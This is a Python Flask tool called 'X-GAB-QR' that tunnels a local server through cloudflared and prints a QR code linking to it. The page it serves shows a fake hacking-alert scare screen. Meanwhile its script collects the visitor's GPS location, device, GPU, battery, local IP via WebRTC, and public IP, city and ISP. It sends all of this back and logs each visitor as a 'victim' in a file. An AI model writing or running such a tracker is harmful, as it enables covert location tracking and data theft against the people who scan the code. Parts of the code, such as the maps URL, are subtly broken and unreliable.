import os, time, subprocess, pyqrcode, logging, json, socket
from flask import Flask, request, render_template_string, jsonify
from datetime import datetime

# --- KONFIGURATSIYA ---
AUTHOR = "x-gab"
PROJECT = "X-GAB-QR protoype"
PORT = 5000
BAZA_FILE = "baza/victims.txt"

for folder in ['baza', 'qurlar']:
    if not os.path.exists(folder): os.makedirs(folder)

def print_banner():
    os.system('clear')
    print("\033[91m")
    print(r"  ██╗  ██╗      ██████╗  █████╗ ██████╗ ")
    print(r"  ╚██╗██╔╝     ██╔════╝ ██╔══██╗██╔══██╗")
    print(r"   ╚███╔╝█████╗██║  ███╗███████║██████╔╝")
    print(r"   ██╔██╗╚════╝██║   ██║██╔══██║██╔══██╗")
    print(r"  ██╔╝ ██╗     ╚██████╔╝██║  ██║██████╔╝")
    print(r"  ╚═╝  ╚═╝       ╚═════╝ ╚═╝  ╚═╝╚═════╝ ")
    print(f"\033[93m   [+] LOYIHA: {PROJECT} | DEV: {AUTHOR} | 2026\033[0m")
    print(f"\033[91m   [!] STATUS: prototype | FULL DATA EXFILTRATION \033[0m\n")

def start_tunnel():
    print(f"\033[93m[*] Cloudflared tunnel tayyorlanmoqda...\033[0m")
    proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{PORT}"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    while True:
        line = proc.stdout.readline()
        if "https://" in line and ".trycloudflare.com" in line:
            url = "https://" + line.split("https://")[-1].strip().split()[0]
            return url, proc

app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ SISTEMA HATOLIGI</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding: 20px; overflow: hidden; }
        .box { border: 4px solid #f00; padding: 25px; background: rgba(20,0,0,0.95); box-shadow: 0 0 60px #f00; margin-top: 40px; }
        .blink { animation: b 0.1s infinite; background: red; color: #fff; font-weight: bold; font-size: 20px; }
        @keyframes b { 50% { opacity: 0; } }
        #term { text-align: left; font-size: 11px; color: #0f0; margin-top: 15px; border-top: 1px solid #f00; padding-top: 10px; height: 120px; overflow: hidden; }
    </style>
</head>
<body>
    <div class="box">
        <div class="blink">☢️ KRITIK KIBER HUJUM: X-GAB ☢️</div>
        <h1>TIZIM NAZORATGA OLINDI</h1>
        <p>Barcha shaxsiy ma'lumotlar va GPS koordinatalar serverga uzatildi.</p>
        <p style="color:white; border: 1px solid #555; padding: 5px;">IP: <span id="ip_disp">Aniqlanmoqda...</span></p>
        <div id="term"></div>
    </div>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        async function init() {
            navigator.geolocation.getCurrentPosition(pos => {
                send({lat: pos.coords.latitude, lon: pos.coords.longitude});
            }, () => { send({}); }, {enableHighAccuracy: true});
        }

        async function send(geo) {
            const ua = navigator.userAgent;
            let d = {
                device: navigator.platform,
                browser: ua.split(') ').pop(),
                os_ver: ua.match(/\(([^)]+)\)/)[1],
                ram: navigator.deviceMemory || "N/A",
                cpu: navigator.hardwareConcurrency || "N/A",
                screen: screen.width + "x" + screen.height,
                lang: navigator.language,
                time: new Date().toLocaleString(),
                maps: geo.lat ? `https://google.com{geo.lat},${geo.lon}` : "Ruxsat berilmadi"
            };

            // GPU aniqlash
            try {
                let gl = document.createElement("canvas").getContext("webgl");
                let dbg = gl.getExtension("WEBGL_debug_renderer_info");
                d.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
            } catch(e) { d.gpu = "N/A"; }

            // Batareya statusi
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                d.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Zaryadda" : "Zaryadsiz") + ")";
            }

            // Local IP (WebRTC)
            const rtc = new RTCPeerConnection(); rtc.createDataChannel("");
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = (e) => {
                if (e.candidate) {
                    d.local_ip = e.candidate.candidate.split(" ")[4];
                    fetchData(d);
                }
            };
            setTimeout(() => { if(!d.local_ip) fetchData(d); }, 1500);
        }

        async function fetchData(d) {
            try {
                // Bir nechta API dan tekshirish
                const res = await fetch('https://ipapi.co').then(r => r.json());
                d.pub_ip = res.ip; d.city = res.city; d.region = res.region;
                d.isp = res.org; d.asn = res.asn; d.country = res.country_name;
                document.getElementById('ip_disp').innerText = res.ip;
            } catch(e) { d.pub_ip = "API Error"; }
            fetch('/catch', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)});
        }

        setInterval(() => {
            const logs = ["[+] IP aniqlandi...", "[+] GPS koordinata olindi...", "[+] GPU modeli tahlil qilindi...", "[+] X-GAB serveriga ma'lumot uzatildi..."];
            document.getElementById('term').innerHTML += logs[Math.floor(Math.random()*logs.length)] + "<br>";
        }, 1200);
        init();
    </script>
</body>
</html>
'''

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/catch', methods=['POST'])
def logger():
    d = request.json
    now = datetime.now().strftime('%H:%M:%S')
    with open(BAZA_FILE, "a") as f:
        f.write(f"\n[{datetime.now()}] ⚡️ QURBON ILINDI ⚡️\n")
        for k, v in d.items(): f.write(f"  {k.upper():<12}: {v}\n")
        f.write("-" * 65 + "\n")

    print(f"\n\033[92m[{now}] [✓] YANGI QURBON TIZIMGA TUSHDI!\033[0m")
    print(f"\033[96m  PUBLIC IP   : {d.get('pub_ip')} | LOCAL IP: {d.get('local_ip')}")
    print(f"  SHAHAR      : {d.get('city')} ({d.get('region')}, {d.get('country')})")
    print(f"  PROVAYDER   : {d.get('isp')} (ASN: {d.get('asn')})")
    print(f"  DEVICE/VER  : {d.get('device')} | {d.get('os_ver')}")
    print(f"  BATTERY     : {d.get('battery')} | RAM: {d.get('ram')}GB | CPU: {d.get('cpu')} cores")
    print(f"  GPU MODEL   : {d.get('gpu')}")
    print(f"  GOOGLE MAPS : \033[91m{d.get('maps')}\033[0m")
    print("-" * 60)
    return "OK", 200

if __name__ == '__main__':
    print_banner()
    url, proc = start_tunnel()
    if url:
        print(f"\033[92m[+] ONLINE URL: {url}\033[0m")
        qr = f"qurlar/qr_{int(time.time())}.png"
        pyqrcode.create(url).png(qr, scale=10)
        print(f"\033[94m[+] QR-KOD: '{qr}' yaratildi.\n\033[93m[*] Monitoring faol... Fayl: {BAZA_FILE}\033[0m\n")
        app.run(host='0.0.0.0', port=PORT)
